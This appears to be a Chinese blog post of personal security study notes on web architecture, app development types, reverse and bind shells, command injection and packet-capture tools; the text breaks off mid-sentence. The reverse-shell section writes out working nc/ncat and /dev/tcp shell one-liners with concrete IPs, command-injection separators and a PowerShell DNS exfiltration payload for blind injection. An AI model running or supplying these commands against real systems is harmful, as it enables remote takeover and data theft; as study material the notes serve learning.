{"title":"网安知识点笔记（持续更新中）","uid":"b08904c0bab28ee83d3b8e8bd866184d","slug":"网安知识点","date":"2025-09-13T09:00:00.000Z","updated":"2025-09-20T05:40:43.205Z","comments":true,"path":"api/articles/网安知识点.json","keywords":null,"cover":"/images/a.jpg","content":"<h1>网安知识点</h1>\n<h2 id=\"基础入门\">基础入门</h2>\n<h3 id=\"一、Web-应用\">一、Web 应用</h3>\n<h4 id=\"Web-四大件\">Web 四大件</h4>\n<h5 id=\"1-系统\">1.系统</h5>\n<ul>\n<li>Linux、windows、macos</li>\n</ul>\n<h5 id=\"2-中间件\">2.中间件</h5>\n<ul>\n<li>我们经常管 web 中间件叫做 web 服务器或者 web 容器，中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</li>\n<li>也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）</li>\n<li>常见的 web 中间件有: Apache Websphere IIS tomcat JBoss Weblogic IBM HTTP Server NGINX</li>\n<li>核心功能包括：\n<ul>\n<li>1.HTTP 协议处理：解析请求并生成响应（如 Apache、Nginx 的 HTTP 引擎）</li>\n<li>2.静态资源服务：直接返回 HTML、CSS、图片等文件</li>\n<li>3.动态内容支持：通过 PHP、Node.js 等语言生成个性化数据</li>\n<li>4.安全控制：SSL/TLS 加密、访问权限管理</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"font-weight:bold; font-size:1.1em;\">中间件配置对后续部署的影响</span></p>\n<p>中间件（如 Nginx、Tomcat、Redis）的配置直接影响系统的性能、稳定性和可维护性，具体如下：</p>\n<ul>\n<li><strong>负载均衡</strong>：Nginx 可配置反向代理，将请求分发到多个后端服务器，避免单节点过载，提升系统可用性。</li>\n<li><strong>缓存策略</strong>：Redis 作为缓存中间件，合理配置缓存过期时间和淘汰策略，可减少数据库访问压力，加快响应速度。</li>\n<li><strong>安全防护</strong>：中间件可配置 SSL 证书（HTTPS）、请求过滤（防 SQL 注入、XSS），增强系统安全性。</li>\n<li><strong>日志与监控</strong>：中间件的日志配置（如访问日志、错误日志）便于后续故障排查，监控配置（如 CPU / 内存占用）可提前发现性能瓶颈</li>\n</ul>\n<h5 id=\"3-数据库\">3.数据库</h5>\n<ul>\n<li>常见的有：mysql，mssql，access</li>\n</ul>\n<p>本地存储：</p>\n<ul>\n<li>源码和数据库放在一起</li>\n</ul>\n<p>站库分离：</p>\n<ul>\n<li>\n<p>将网站应用程序（前端 + 后端）与数据库服务器分离部署在不同服务器上，优势包括：</p>\n</li>\n<li>\n<p><strong>提升性能</strong>：应用和数据库服务器资源独立分配，避免相互抢占资源（如 CPU、内存）。</p>\n</li>\n<li>\n<p><strong>增强安全性</strong>：数据库服务器可单独配置防火墙和访问策略，减少直接暴露风险。</p>\n</li>\n<li>\n<p><strong>便于扩展</strong>：应用和数据库可各自根据流量需求扩容，例如数据库可通过主从复制提升读性能。</p>\n</li>\n</ul>\n<p>云数据库：</p>\n<ul>\n<li>安全组和登陆方式配置可以更加复杂。甚至有 oos 对象存储服务，专门用来放置图片和视频，更加安全</li>\n</ul>\n<h5 id=\"4-源码\">4.源码</h5>\n<p>实现网站功能的代码集合，包括：</p>\n<ul>\n<li>1.前端技术：HTML/CSS/JavaScript 构建用户界面，框架如 Vue、React</li>\n<li>2.后端逻辑：PHP、Python、Java 等处理业务</li>\n<li>3.架构模式：\n<ul>\n<li>单体应用：传统模式，代码集中</li>\n<li>微服务：模块式拆分，适合复杂系统</li>\n</ul>\n</li>\n</ul>\n<p>源码类型：</p>\n<ul>\n<li>开源、商业、自研</li>\n</ul>\n<h4 id=\"Web-架构\">Web 架构</h4>\n<h5 id=\"1-常规化\">1.常规化</h5>\n<ul>\n<li>原理：源码数据都在同服务器</li>\n<li>影响：无，常规安全测试手法</li>\n</ul>\n<h5 id=\"2-站库分离\">2.站库分离</h5>\n<ul>\n<li>原理：源码数据库不在同服务器</li>\n<li>存储：其他服务器上数据库&amp;云数据库产品</li>\n<li>影响：数据被单独存放，能连接才可影响数据</li>\n</ul>\n<h5 id=\"3-前后端分离\">3.前后端分离</h5>\n<ul>\n<li>原理：前端 JS 框架，API 传输数据</li>\n<li>影响：\n<ul>\n<li>1.前端页面大部分不存在漏洞</li>\n<li>2.后端管理大部分不在同域名</li>\n<li>3.获得权限有可能不影响后端</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"4-宝塔-phpstudy\">4.宝塔+phpstudy</h5>\n<ul>\n<li>原理：打包类集成环境，权限配置或受配置</li>\n<li>影响：攻击者权限对比区别</li>\n<li>区别：宝塔更安全一点</li>\n</ul>\n<h5 id=\"5-Docker-容器\">5.Docker 容器</h5>\n<ul>\n<li>原理：虚拟化技术独立磁盘空间</li>\n<li>影响：攻击者虚拟空间磁盘</li>\n</ul>\n<h5 id=\"6-建站分配站\">6.建站分配站</h5>\n<ul>\n<li>1.托管<br>\n2.申请</li>\n<li>原理：利用别人域名模版建立</li>\n<li>影响：实质安全测试非目标资产</li>\n</ul>\n<h5 id=\"7-静态-Web\">7.静态 Web</h5>\n<ul>\n<li>例子：大学学的 html 设计网站</li>\n<li>原理：数据没有传输性（js 传输不算）</li>\n<li>影响：无漏洞</li>\n</ul>\n<h5 id=\"8-WAF\">8.WAF</h5>\n<ul>\n<li>原理：Web 应用防火墙，旨在提供保护</li>\n<li>影响：常规 Web 安全测试手段会受到拦截</li>\n<li>演示：免费 D 盾防护软件</li>\n<li>Windows2012 + IIS +D 盾</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250613190037589.png\" alt=\"image-20250613190037589\"></p>\n<h5 id=\"9-CDN\">9.CDN</h5>\n<ul>\n<li>原理：内容分发服务，旨在提高访问速度</li>\n<li>影响：隐藏真实源 IP，导致对目标测试错误</li>\n<li>演示：阿里云备案域名全局 CDN 加速服务</li>\n<li>Windows2012 + BT 宝塔面板 + CDN 服务</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250613190108020.png\" alt=\"image-20250613190108020\"></p>\n<h5 id=\"10-OSS\">10.OSS</h5>\n<ul>\n<li>\n<p>原理：云存储服务，旨在提高访问速度</p>\n</li>\n<li>\n<p>演示：<a href=\"https://cloudreve.org/\">https://cloudreve.org/</a></p>\n<p>Windows2012 + cloudreve + 阿里云 OSS</p>\n<p><a href=\"https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1\">https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1</a></p>\n<p>1、启动应用</p>\n<p>2、登录管理</p>\n<p>3、配置存储信息</p>\n<p>4、更改用户组存储属性</p>\n</li>\n<li>\n<p>阿里云 OSS:</p>\n<p>1、开通 OSS</p>\n<p>2、新建 Bucket</p>\n<p>3、配置 Bucket 属性</p>\n<p>4、配置 Access 访问</p>\n</li>\n</ul>\n<p><strong>为什么要使用第三方存储？</strong></p>\n<ul>\n<li>静态文件会占用大量带宽</li>\n<li>加载速度</li>\n<li>存储空间</li>\n</ul>\n<p>影响：</p>\n<ul>\n<li>\n<p>上传的文件或解析的文件均来自于 OSS 资源，无法解析，单独存储</p>\n<ul>\n<li>\n<p>1、修复上传安全</p>\n</li>\n<li>\n<p>2、文件解析不一样</p>\n</li>\n<li>\n<p>3、但 Accesskey 隐患</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250613190117517.png\" alt=\"image-20250613190117517\"></p>\n<h5 id=\"11-反向代理\">11.反向代理</h5>\n<ul>\n<li>\n<p>正向代理为客户端服务, 客户端主动建立代理访问目标（不代理不可达）</p>\n<p>反向代理为服务端服务, 服务端主动转发数据给可访问地址（不主动不可达）</p>\n</li>\n<li>\n<p>原理：通过网络反向代理转发真实服务达到访问目的</p>\n</li>\n<li>\n<p>影响：访问目标只是个代理，并非真实应用服务器</p>\n</li>\n<li>\n<p>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</p>\n</li>\n<li>\n<p>补充：正向代理就相当于一个服务器你无法访问自己找了个代理服务器去访问<br>\n反向代理就是你本来无法访问那个服务器，所以服务器那边整了个搭理服务器让你访问</p>\n</li>\n</ul>\n<h5 id=\"12-负载均衡\">12.负载均衡</h5>\n<ul>\n<li>原理：分摊到多个操作单元上进行执行，共同完成工作任务</li>\n<li>影响：有多个服务器加载服务，测试过程中存在多个目标情况</li>\n</ul>\n<h3 id=\"二、App-应用\">二、App 应用</h3>\n<h4 id=\"应用开发架构\">应用开发架构</h4>\n<h5 id=\"1-原生开发\">1.原生开发</h5>\n<p>原生 APP 开发是指针对特定平台(iOS/Android)使用官方语言和工具进行开发的方式。</p>\n<p>安卓一般使用 java 语言开发，当然现在也有 kotlin 语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p>\n<p>原生开发有以下特点：</p>\n<p>（1）<strong>平台特性</strong></p>\n<ul>\n<li>iOS 使用 Swift/Objective-C + Xcode 开发，遵循 Apple 设计规范</li>\n<li>Android 使用 Java/Kotlin + Android Studio 开发，遵循 Material Design</li>\n</ul>\n<p>（2）<strong>安全优势</strong></p>\n<ul>\n<li>性能优化好，可直接调用系统安全 API</li>\n<li>可实施更严格的安全措施如代码混淆、完整性校验</li>\n<li>支持双向 TLS(mTLS)等高级安全协议</li>\n</ul>\n<p>（3）<strong>安全风险</strong></p>\n<ul>\n<li>需防范逆向工程(反编译、动态调试)</li>\n<li>API 接口暴露风险</li>\n<li>平台差异导致的安全策略不一致</li>\n</ul>\n<p>（4）<strong>网安测试要点</strong></p>\n<ul>\n<li>接口安全测试(抓包分析)</li>\n<li>本地数据存储安全</li>\n<li>组件权限配置检查</li>\n</ul>\n<p>（5）<strong>安全影响</strong></p>\n<ul>\n<li>反编译&amp;抓包&amp;常规测试</li>\n<li>逆向的角度去分析逻辑设计安全</li>\n</ul>\n<h5 id=\"2-H5-语言开发\">2.H5 语言开发</h5>\n<p>H5(HTML5)是 HTML 的第五代标准，作为现代 Web 开发的核心技术，它已成为构建跨平台应用的重要工具。</p>\n<p>使用 H5 开发的好处有很多，可多端复用，比如浏览器端，ios 端，当然 H5 开发的体验是没有原生好的。一般来说如果这个页面需要分享出去的话，就用 H5 开发。</p>\n<p>H5 开发具有以下特点：</p>\n<p>（1）<strong>H5 技术基础</strong></p>\n<ul>\n<li>核心组件：HTML5(结构)+CSS3(样式)+JavaScript(逻辑)，三者协同工作</li>\n<li>关键 API：Canvas 绘图、WebGL(3D 渲染)、Web Audio(音频处理)、Geolocation(定位)等</li>\n<li>存储机制：支持 localStorage/sessionStorage 本地存储，比 Cookie 更安全但需防范 XSS 攻击</li>\n</ul>\n<p>（2）<strong>安全特性</strong></p>\n<ul>\n<li>沙箱机制：默认运行在浏览器安全沙箱中，限制系统资源访问</li>\n<li>CORS 策略：通过跨域资源共享策略控制外部资源访问</li>\n<li>HTTPS 支持：强制要求混合内容中的敏感资源使用安全传输</li>\n</ul>\n<p>（3）<strong>安全风险</strong></p>\n<ul>\n<li>XSS 漏洞：动态内容注入风险高于原生应用</li>\n<li>数据泄露：本地存储数据可能被恶意读取</li>\n<li>中间人攻击：网络阐述层需额外加密保护</li>\n</ul>\n<h5 id=\"3-使用-flutter-开发\">3.使用 flutter 开发</h5>\n<p>Flutter 是 Google 推出的跨平台应用开发框架，使用 Dart 语言编写，能够构建 iOS、Android、Web 及桌面端应用。但由于是近几年退出的的，技术比较新，生态还不完善，开发效率偏低</p>\n<p>Flutter 开发具有以下特点：</p>\n<p>（1）<strong>核心特性</strong></p>\n<ul>\n<li>跨平台支持：一套代码可编译为 iOS、Android、Web、Windows、macOS 和 Linux 应用</li>\n<li>高性能渲染：使用 Skia 引擎直接渲染，绕过平台原生组件，性能接近原生应用</li>\n<li>热重载功能：修改代码后无需重启应用即可看到效果，大幅提升开发效率</li>\n</ul>\n<p>（2）<strong>安全优势</strong></p>\n<ul>\n<li>代码混淆支持：可对 Dart 代码进行混淆，增加逆向工程难度</li>\n<li>安全存储机制：提供 <code>flutter_secure_storage</code> 等插件安全存储敏感数据</li>\n<li>HTTPS 强制支持：网络请求默认强制使用 HTTPS 加密传输</li>\n</ul>\n<p>（3）<strong>安全风险</strong></p>\n<ul>\n<li>Dart 代码反编译：相比原生代码更易被反编译分析</li>\n<li>插件安全依赖：第三方插件可能引入安全漏洞</li>\n<li>跨平台一致性风险：不同平台可能实现安全机制不一致</li>\n</ul>\n<p>（4）<strong>网安测试要点</strong></p>\n<ul>\n<li>接口安全测试：检查 API 接口的认证、授权和数据加密</li>\n<li>本地存储检查：验证敏感数据是否加密存储</li>\n<li>权限管理审计：检查应用是否遵循最小权限原则</li>\n<li>代码混淆验证：确认发布版本是否经过充分混淆</li>\n</ul>\n<h5 id=\"4-常规-Web-开发\">4.常规 Web 开发</h5>\n<p>Web 开发是构建在互联网上运行的网站和应用程序的过程，主要分为前端和后端两大技术方向。</p>\n<p>Web App 软件开发简单地说，就是开发一个网站，然后加入 app 的壳。Web App 一般非常小，内容都是 app 内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且 app 内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p>\n<p>Web 开发具有以下特点：</p>\n<p>（1）<strong>核心技术栈</strong></p>\n<ul>\n<li>前端技术：\n<ul>\n<li>HTML：定义网页结构和内容</li>\n<li>CSS：控制网页样式和布局</li>\n<li>JavaScript：实现交互功能和动态效果</li>\n<li>前端框架：React、Vue、Angular 等提高开发效率</li>\n</ul>\n</li>\n<li>后端技术：\n<ul>\n<li>服务器语言：PHP、Java、Python、Node.js 等</li>\n<li>数据库：MySQL、PostgreSQL、MongoDB 等</li>\n<li>Web 服务器：Apache、Nginx 等</li>\n</ul>\n</li>\n</ul>\n<p>（2）<strong>安全特性</strong></p>\n<ul>\n<li>浏览器安全机制：\n<ul>\n<li>同源策略限制跨域访问</li>\n<li>CSP(内容安全策略)可缓解 XSS 攻击</li>\n<li>HTTPS 加密传输保障数据安全</li>\n</ul>\n</li>\n<li>认证与授权：\n<ul>\n<li>支持多种认证方式(OAuth、JWT 等)</li>\n<li>可实施细粒度访问控制</li>\n</ul>\n</li>\n</ul>\n<p>（3）<strong>安全风险</strong></p>\n<ul>\n<li>常见漏洞：\n<ul>\n<li>XSS(跨站脚本攻击)</li>\n<li>SQL 注入</li>\n<li>CSRF(跨站请求伪造)</li>\n<li>文件上传漏洞</li>\n</ul>\n</li>\n<li>数据安全风险：\n<ul>\n<li>敏感信息泄露</li>\n<li>会话劫持</li>\n<li>API 接口滥用</li>\n</ul>\n</li>\n</ul>\n<p>（4）<strong>网安测试要点</strong></p>\n<ul>\n<li>渗透测试：\n<ul>\n<li>检查输入验证和输出编码</li>\n<li>测试认证和会话管理机制</li>\n<li>验证敏感数据保护措施</li>\n</ul>\n</li>\n<li>代码审计\n<ul>\n<li>检查安全编码实践</li>\n<li>识别硬编码凭证</li>\n<li>评估第三方库风险</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"三、反弹-shell\">三、反弹 shell</h3>\n<h4 id=\"1-文件上传下载\">1.文件上传下载</h4>\n<p>作用：解决无图形化&amp;解决数据传输</p>\n<p>使用：在 ip 地址搭建 web 在目录上放我们的工具，访问即可下载，我们利用网站生成传输文件命令，通过命令执行漏洞让目标下载上我们的工具，然后可以进行我们下一步的操作</p>\n<p>![](…/images/网安知识点/屏幕截图 2025-06-15 232304.png)</p>\n<p>![](…/images/网安知识点/屏幕截图 2025-06-15 233009.png)</p>\n<h4 id=\"2-反弹-shell-命令\">2.反弹 shell 命令</h4>\n<p>（1）<strong>定义</strong></p>\n<ul>\n<li>反弹 Shell 是一种网络攻击技术，<strong>被控端（受害者）主动连接控制端（攻击者）</strong>，并将命令行输入输出重定向到控制端，实现远程控制。与传统的 SSH、Telnet 等 <strong>正向连接</strong> 相反，反弹 Shell 通过角色反转绕过防火墙等限制</li>\n</ul>\n<p>（2）<strong>基本原理</strong></p>\n<ul>\n<li><strong>控制端</strong>：监听指定 TCP/UDP 端口（如 <code>nc -lvp 4444</code>）。</li>\n<li><strong>被控端</strong>：执行命令将 Shell 会话重定向到控制端（如 <code>bash -i &amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</code>），通过 Socket 通信传输数据</li>\n</ul>\n<p>（3）<strong>正向连接</strong></p>\n<ul>\n<li><span style=\"font-weight:bold;\">定义</span>：正向连接指 <strong>控制端（攻击者）主动发起连接</strong> 至被控端（目标机器），要求目标机器开放指定端口并允许入站连接</li>\n<li><span style=\"font-weight:bold;\">原理</span>：\n<ul>\n<li>被控端启动监听服务（如 <code>nc -lvvp 5566 -e /bin/bash</code>）。</li>\n<li>控制端主动连接目标 IP 和端口（如 <code>nc 目标IP 5566</code>），建立 Shell 会话</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">Linux 控制 Windows</span></li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绑定 <span class=\"built_in\">CMD</span> 到本地 <span class=\"number\">5566</span> 端口</span><br><span class=\"line\">nc -e <span class=\"built_in\">cmd</span> -lvp <span class=\"number\">5566</span></span><br><span class=\"line\">//主动连接目标 <span class=\"number\">5566</span></span><br><span class=\"line\">ncat <span class=\"number\">47</span>.<span class=\"number\">122</span>.<span class=\"number\">23</span>.<span class=\"number\">131</span> <span class=\"number\">5566</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><span style=\"font-weight:bold;\">Windows 控制 Linux</span></li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绑定 SH 到本地 <span class=\"number\">5566</span> 端口</span><br><span class=\"line\">ncat -e /bin/sh -lvp <span class=\"number\">5566</span></span><br><span class=\"line\">//主动连接目标 <span class=\"number\">5566</span></span><br><span class=\"line\">nc <span class=\"number\">47</span>.<span class=\"number\">94</span>.<span class=\"number\">236</span>.<span class=\"number\">117</span> <span class=\"number\">5566</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><span style=\"font-weight:bold;\">特点</span>：\n<ul>\n<li>控制端主动连接目标</li>\n<li>类似 SSH/Telnet 等传统服务</li>\n<li>适用于内网无防护环境</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">限制</span>：\n<ul>\n<li>目标需有固定公网 IP 或端口映射</li>\n<li>防火墙/NAT 可能阻止入站连接</li>\n<li>动态 IP 目标难以持续控制</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">典型场景</span>：\n<ul>\n<li>内网渗透：攻击已进入内网，直接连接未防护的目标机器</li>\n<li>服务暴露：目标机器主动开放端口提供远程管理（如数据库服务）</li>\n</ul>\n</li>\n</ul>\n<p>（4）<strong>反向连接</strong></p>\n<ul>\n<li><span style=\"font-weight:bold;\">定义</span>：\n<ul>\n<li>反向连接指 <strong>被控端主动连接控制端</strong>，由攻击者预先监听端口，目标机器发起请求建立 Shell 会话</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">原理</span>：\n<ul>\n<li>控制端监听端口（如 <code>nc -lvp 4444</code>）。</li>\n<li>被控端执行命令反向连接（如 <code>bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</code>）</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">Windows 控制 Linux</span></li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绑定 <span class=\"built_in\">CMD</span> 到目标 <span class=\"number\">5566</span> 端口</span><br><span class=\"line\">ncat -e /bin/sh <span class=\"number\">47</span>.<span class=\"number\">122</span>.<span class=\"number\">23</span>.<span class=\"number\">131</span> <span class=\"number\">5566</span>  //靶机</span><br><span class=\"line\">//等待 <span class=\"number\">5566</span> 连接</span><br><span class=\"line\">nc -lvvp <span class=\"number\">5566</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><span style=\"font-weight:bold;\">Linux 控制 Windows</span></li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//绑定 <span class=\"built_in\">CMD</span> 到目标 <span class=\"number\">5566</span> 端口</span><br><span class=\"line\">nc -e <span class=\"built_in\">cmd</span> <span class=\"number\">47</span>.<span class=\"number\">94</span>.<span class=\"number\">236</span>.<span class=\"number\">117</span> <span class=\"number\">5566</span>   //靶机</span><br><span class=\"line\">//等待 <span class=\"number\">5566</span> 连接</span><br><span class=\"line\">ncat -lvvp <span class=\"number\">5566</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><span style=\"font-weight:bold;\">特点</span>：\n<ul>\n<li>被控端主动出站</li>\n<li>控制端无需暴露 IP</li>\n<li>适应动态 IP 环境</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">优势</span>：\n<ul>\n<li>绕过防火墙/NAT 限制</li>\n<li>隐蔽性强，避免 IDS 检测</li>\n<li>适合外网渗透和持久控制</li>\n</ul>\n</li>\n<li><span style=\"font-weight:bold;\">典型场景</span>：\n<ul>\n<li><strong>防火墙绕过</strong>：目标仅允许出站流量（如企业内网）</li>\n<li><strong>动态 IP 控制</strong>：目标 IP 频繁变化（如家庭宽带）</li>\n<li><strong>恶意软件分发</strong>：木马主动连接 C2 服务器</li>\n</ul>\n</li>\n</ul>\n<p>（5）<strong>正反向连接对比</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>对比维度</strong></th>\n<th style=\"text-align:center\"><strong>正向连接</strong></th>\n<th style=\"text-align:center\"><strong>反向连接</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>连接方向</strong></td>\n<td style=\"text-align:center\">控制端 → 被控端</td>\n<td style=\"text-align:center\">被控端 → 控制端</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>防火墙穿透</strong></td>\n<td style=\"text-align:center\">依赖入站规则</td>\n<td style=\"text-align:center\">利用出站规则</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>适用环境</strong></td>\n<td style=\"text-align:center\">内网无防护</td>\n<td style=\"text-align:center\">外网/动态 IP</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>隐蔽性</strong></td>\n<td style=\"text-align:center\">易被检测</td>\n<td style=\"text-align:center\">隐蔽性高</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>工具依赖</strong></td>\n<td style=\"text-align:center\">需目标开放端口</td>\n<td style=\"text-align:center\">需控制端监听端口</td>\n</tr>\n</tbody>\n</table>\n<p>（6）<strong>命令执行</strong></p>\n<ul>\n<li>通过管道符，进行额外的命令执行</li>\n<li>windows： |  &amp;  ||  &amp;&amp;</li>\n<li>Linux： ;  |  ||  &amp;  &amp;&amp;  （特有``和;）</li>\n<li>例子：\n<ul>\n<li>ping -c 1 127.0.0.1 ; whoami</li>\n</ul>\n</li>\n</ul>\n<p>（7）<strong>数据不回显</strong></p>\n<ul>\n<li>通常我们执行命令，要先看目标是什么系统，但如果没有回显，就不能用 ping -c 1 127.0.0.1 ; whoami</li>\n<li>如果是 Linux 的话，我们可以 ping 反引号+whoami+反引号.dns 网址，就可以在那个网址上看到执行完 whoami 的 ip</li>\n<li>但 windows 不行，windows 并没有``所以我们需要，用别的方法来进行操作，比如</li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">127</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">1</span> | powershell $x=whoami;$x=$x.<span class=\"built_in\">Replace</span>(&#x27;\\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.dns网址&#x27;;$z=$x+$y;<span class=\"built_in\">ping</span> $z</span><br><span class=\"line\">//我们可以通过powershell将我们想要输出的内容，通过变量进行输出，这样也可以得到我们想要的信息</span><br></pre></td></tr></table></figure>\n<h3 id=\"四、抓包工具\">四、抓包工具</h3>\n<h4 id=\"Fiddler\">Fiddler</h4>\n<ul>\n<li>\n<p><strong>核心定位</strong>：HTTP/HTTPS 调试代理，专注 Web 应用层安全分析</p>\n</li>\n<li>\n<p><strong>协议支持</strong>：HTTP/HTTPS（可解密 SSL/TLS）、WebSocket。</p>\n</li>\n<li>\n<p><strong>网络安全应用场景</strong>：</p>\n<ul>\n<li><strong>漏洞挖掘</strong>：拦截修改请求/响应，测试 XSS、CSRF、参数篡改等漏洞</li>\n<li><strong>会话劫持</strong>：捕获 Cookie/Session ID，重放会话验证身份验证缺陷</li>\n<li><strong>HTTPS 解密</strong>：通过中间人攻击（MITM）解密 HTTPS 流量，分析加密内容</li>\n</ul>\n</li>\n<li>\n<p><strong>使用技巧</strong>：</p>\n<ul>\n<li><strong>断点调试</strong>：<code>Rules &gt; Automatic Breakpoints</code> 拦截请求修改参数（如注入 Payload）</li>\n<li><strong>AutoResponder</strong>：模拟恶意响应（如替换 JS 文件植入后门）</li>\n<li><strong>移动端抓包</strong>：配置手机代理至 PC IP+端口（默认 8888），安装 Fiddler 根证书解密 HTTPS</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Charles\">Charles</h4>\n<ul>\n<li><strong>核心定位</strong>：HTTP/HTTPS 代理，侧重 API 调试与可视化分析</li>\n<li><strong>协议支持</strong>：HTTP/HTTPS、FTP、SMTP。</li>\n<li><strong>网络安全应用场景</strong>：\n<ul>\n<li><strong>API 安全测试</strong>：树状结构展示请求层级，分析接口参数敏感数据泄露</li>\n<li><strong>重放攻击测试</strong>：修改历史请求重复发送，验证服务端幂等性漏洞</li>\n<li><strong>弱网模拟</strong>：<code>Proxy &gt; Throttle Settings</code> 测试超时处理、重放攻击成功率</li>\n</ul>\n</li>\n<li><strong>使用技巧</strong>：\n<ul>\n<li><strong>Map 功能</strong>：重定向请求至恶意服务器（<code>Tools &gt; Map Remote</code>）</li>\n<li><strong>SSL 代理</strong>：<code>Proxy &gt; SSL Proxying Settings</code> 添加 <code>*:443</code> 全局解密 HTTPS</li>\n<li><strong>移动端配置</strong>：类似 Fiddler，需安装 Charles 证书（<code>Help &gt; SSL Proxying</code>）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"TcpDump\">TcpDump</h4>\n<ul>\n<li><strong>核心定位</strong>：命令行网络嗅探器，适用于服务器层流量捕获</li>\n<li><strong>协议支持</strong>：全协议（TCP/IP 栈），包括 ARP、ICMP、DNS 等。</li>\n<li><strong>网络安全应用场景</strong>：\n<ul>\n<li><strong>网络层攻击检测</strong>：抓取 SYN 洪水攻击（<code>tcpdump 'tcp[tcpflags] &amp; tcp-syn != 0'</code>）</li>\n<li><strong>异常流量分析</strong>：识别异常 ARP 请求（ARP 欺骗）、异常 ICMP（隧道攻击）</li>\n<li><strong>数据泄露监控</strong>：捕获含敏感关键词的明文传输（如 <code>tcpdump -A port 80 | grep &quot;password&quot;</code>）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"BurpSuite\"><strong>BurpSuite</strong></h4>\n<ul>\n<li><strong>核心定位</strong>：集成化 Web 应用渗透测试平台</li>\n<li><strong>协议支持</strong>：HTTP/HTTPS、WebSocket。</li>\n<li><strong>网络安全应用场景</strong>：\n<ul>\n<li><strong>自动化漏洞扫描</strong>：<code>Scanner</code> 模块检测 SQL 注入、XSS 等 OWASP Top 10 漏洞</li>\n<li><strong>暴力破解</strong>：<code>Intruder</code> 模块自动化密码爆破（如撞库攻击测试）</li>\n<li><strong>逻辑漏洞挖掘</strong>：<code>Repeater</code> 修改请求顺序，测试越权、支付漏洞</li>\n</ul>\n</li>\n<li><strong>使用技巧</strong>：\n<ul>\n<li><strong>证书配置</strong>：浏览器安装 Burp CA 证书（<code>http://burp/cert</code>）解密 HTTPS</li>\n<li><strong>爬虫与扫描</strong>：<code>Spider</code> 映射站点结构，<code>Scanner</code> 自动扫描入口点</li>\n<li><strong>插件扩展</strong>：集成 <code>Logger++</code> 记录历史流量，<code>Autorize</code> 测试垂直越权</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Wireshark\">Wireshark</h4>\n<ul>\n<li><strong>核心定位</strong>：全协议深度解析的网络协议分析器</li>\n<li><strong>协议支持</strong>：超 700 种协议（TCP/IP、DNS、DHCP、SSH 等）。</li>\n<li><strong>网络安全应用场景</strong>：\n<ul>\n<li><strong>协议漏洞分析</strong>：解析异常协议字段（如畸形 DNS 响应引发缓存中毒）</li>\n<li><strong>网络取证</strong>：重组 TCP 